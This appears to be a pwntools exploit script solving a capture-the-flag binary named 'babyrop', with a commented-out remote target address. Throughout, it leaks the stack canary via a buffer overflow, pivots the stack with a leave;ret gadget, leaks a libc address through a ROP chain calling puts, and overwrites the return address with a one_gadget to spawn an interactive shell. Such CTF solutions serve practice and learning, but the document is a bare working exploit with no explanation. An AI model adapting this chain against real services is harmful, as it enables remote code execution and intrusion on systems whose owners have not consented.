from pwn import *
context.log_level = "debug"
context.binary = "./babyrop"

IP, PORT = "123.56.122.14", 33547 
p = process("./babyrop")
# p = remote(IP, PORT)
cmd = "b *0x400862\n" # cmp
cmd = "b *0x40075A\n" # vul ret
# gdb.attach(p, cmd)
gdb.attach(p,'b *0x40073f')
p.sendafter("? \n", "a"*0x19)

p.recvuntil("a"*0x19)
canary = u64("\x00"+p.recv(7))
success(hex(canary))

p.sendlineafter("challenge\n", str(0x4009ae))

leave_ret = 0x400759
stack = 0x601800
payload1 = "a"*0x18+p64(canary)+p64(stack)+p64(0x40072E)
pause()
p.sendafter("message\n", payload1)
pause()
# payload2, canary, fake_stack, leave_ret
call_puts = 0x40086E 
pop_rdi_ret = 0x0000000000400913
payload2 = flat(pop_rdi_ret, 0x600fc0, call_puts)
pause()
p.send(payload2+p64(canary)+p64(0x601800-0x28)+p64(leave_ret))
pause()
libc_base = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")-0x6f6a0
success(hex(libc_base))

pause()
one = libc_base+0x4527a
p.send("a"*0x18+p64(canary)+"aaaaaaaa"+p64(one))
p.interactive()